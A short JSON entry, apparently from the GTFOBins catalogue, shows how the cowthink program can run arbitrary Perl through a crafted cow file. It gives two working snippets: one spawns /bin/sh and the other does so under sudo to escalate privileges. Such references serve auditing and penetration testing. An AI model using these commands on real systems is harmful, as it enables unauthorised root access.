{
  "description": "It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.",
  "functions": {
    "shell": [
      {
        "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowthink -f $TF x\n"
      }
    ],
    "sudo": [
      {
        "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
      }
    ]
  }
}
